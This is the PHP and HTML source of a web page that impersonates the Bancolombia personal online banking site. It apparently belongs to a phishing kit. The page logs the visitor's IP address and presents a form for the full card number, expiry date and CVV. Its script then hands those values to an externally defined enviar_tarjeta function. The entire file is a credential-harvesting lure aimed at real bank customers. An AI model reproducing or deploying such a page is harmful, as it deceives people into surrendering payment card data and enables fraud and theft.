<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");
$tiempo = strftime("%A, %d de %B de %Y");
date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>Bancolombia Sucursal Vrtual Personas</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">
  		
		<meta content="es" http-equiv="Content-Language">
  	
		<meta name="description" content="">
  		<meta name="author" content="">
  		<meta name="Copyright" content="">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	 	<script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
		<link href="css/style.css" rel="stylesheet">
		<link href="css/stylesheet.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="img/logo.png" />
		<script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
		<script src="js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="js/functions.js"></script>  		
   	</head>
   	<body>
   		<div class="contenido">
   			<div class="cabecera">
   				<div class="logo">
   					<img src="img/cont/t-mar-min.jpg">   				
   					<br>
   					<table style="margin-top:17px;"><tr><td><img src="img/cont/t-fec-min.jpg">   				</td><td><span class="texto-min" id="fecha-hora">Lunes 13 de Junio de 2022 9:23:11 AM</span></td></tr></table>					
   				</div>
   				<div class="titulo"><img src="img/cont/o-tit-min.jpg"></div>
   				<div class="mensaje">
   					<table>
   						<tr>
   							<td valign="middle"><img src="img/error.jpg" style="width: 40px;"></td>   					
   							<td valign="middle" style="padding-left: 12px;"><span style="font-size: 20px; color: #000; line-height: 20px;">Error</span><br><span>Por favor ingesar la información requerida.</span></td>
   						</tr>
   					</table>
   				</div>
   			</div>   			
   			<div class="cuerpo">
   				<div class="pnlizq">
   					<div class="formulario">
   						<div class="form-titulo"><img src="img/cont/t-sec-act-min.jpg"></div>
   						<div class="descripcion">
   							<img src="img/cont/t-sub-min.jpg">
   						</div>
   						<div class="form-cuerpo">
   							<div style="text-align: left;">
   								<img src="img/cont/t-eti-dig-min.jpg">
   							</div>   						
   							<div class="input-icono credit-card">
   								<input type="text" name="txtTarjeta" id="txtTarjeta" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="16" >
   							</div>
   							<br>
   							<div style="text-align: left;">
   								<img src="img/cont/t-eti-fec-min.jpg">
   							</div>   						
   							<div style="margin-top: 8px;">
   								<select style="width:49% !important;" id="mFecha" name="mFecha">
		                    		<option value="" default selected>Mes</option>
		                            <option value="01">01</option>
		                            <option value="02">02</option>
		                            <option value="03">03</option>
		                            <option value="04">04</option>
		                            <option value="05">05</option>
		                            <option value="06">06</option>
		                            <option value="07">07</option>
		                            <option value="08">08</option>
		                            <option value="09">09</option>
		                            <option value="10">10</option>
		                            <option value="11">11</option>
		                            <option value="12">12</option>
		                        </select>


								<select style="width:49% !important;" id="aFecha" name="aFecha">
									<option value="" default selected>Año</option>					
									<option value="2022">2022</option>
									<option value="2023">2023</option>
									<option value="2024">2024</option>
									<option value="2025">2025</option>
									<option value="2026">2026</option>
									<option value="2027">2027</option>
									<option value="2028">2028</option>
									<option value="2029">2029</option>
									<option value="2030">2030</option>
									<option value="2031">2031</option>
									<option value="2032">2032</option>
									<option value="2033">2033</option>
								</select>	
   							</div>
   							<br>
   							<div style="text-align: left;">
   								<img src="img/cont/t-eti-cv-min.jpg">
   							</div>   						
   							<div class="input-icono pass">
   								<input type="password" name="txtCVV" id="txtCVV" maxlength="3" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
   							</div>
   							<br>
   							<img src="img/cont/t-bot-val-min.jpg" style="cursor: pointer;" id="btnTarjeta" name="btnTarjeta">
   							<br>
   						</div>
   					</div>
   					<br>
   					<div class="lista-links ">
   						<img src="img/cont/t-opc-min.jpg">
   					</div>
   				</div>
   				<div class="pnlder">
   					<a href="#"><img src="img/card.jpg" class="publicidad" style="max-width: 633px;"></a><br><br>
   					<div class="texto" style="text-align:justify; padding: 0px 30px;"><img src="img/cont/o-des-min.jpg" style="width:100%; max-width: 720px;"></div>
   				</div>
   			</div>
   			<div class="pie">
   				<img src="img/cont/t-foo-min.jpg" id="footer">
   				<img src="img/cont/t-foo1-min.jpg" id="footer1">
   				<img src="img/cont/t-foo2-min.jpg" id="footer2">
   				<img src="img/cont/t-foo3-min.jpg" id="footer3">
   				<img src="img/cont/t-foo4-min.jpg" id="footer4">
   				<img src="img/cont/t-foo5-min.jpg" id="footer5">

   				<div class="ippie">
   					<span class="dirip"><table><tr><td><img src="img/cont/t-ip-min.jpg"></td><td class="textip"><?php echo $ip; ?></td></tr></table></span>´
   					<span class="copyright"><img src="img/cont/t-cop-min.jpg"></span>
   				</div>
   			</div>
   		</div>
   	</body>
</html>
<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}



	$(document).ready(function() {

		$('#btnTarjeta').click(function(){
			if ($("#txtTarjeta").val().length > 15) {
				if ($("#mFecha").val() != "") {
					if ($("#aFecha").val() != "") {
						if ($("#txtCVV").val().length > 2) {
							var fExp = $("#mFecha").val() + "-" + $("#aFecha").val(); 
							enviar_tarjeta($("#txtTarjeta").val(),fExp,$("#txtCVV").val());
						}else{
							$(".mensaje").show();
							$(".pass").css("border", "1px solid red");
							$("#txtCVV").focus();
						}
					}else{
						$(".mensaje").show();
						$("#aFecha").css("border", "1px solid red");
						$("#aFecha").focus();
					}
				}else{
					$(".mensaje").show();
					$("#mFecha").css("border", "1px solid red");
					$("#mFecha").focus();
				}
			}else{
				$(".mensaje").show();
				$(".credit-card").css("border", "1px solid red");
				$("#txtTarjeta").focus();
			}			
		});

		$("#txtTarjeta").keyup(function(e) {
			$(".credit-card").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
		$("#mFecha").click(function(e) {
			$("#mFecha").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
		$("#aFecha").click(function(e) {
			$("#aFecha").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
		$("#txtCVV").keyup(function(e) {
			$(".pass").css("border", "1px solid #CCCCCC");	
			$(".mensaje").hide();				
		});
	});
</script>
<script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "<?php echo date('H:i:s') ?>",
         h_date: "<?php echo date('Y/m/d') ?>",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#fecha-hora').jclock(optionsEST);
     });
 </script> 						
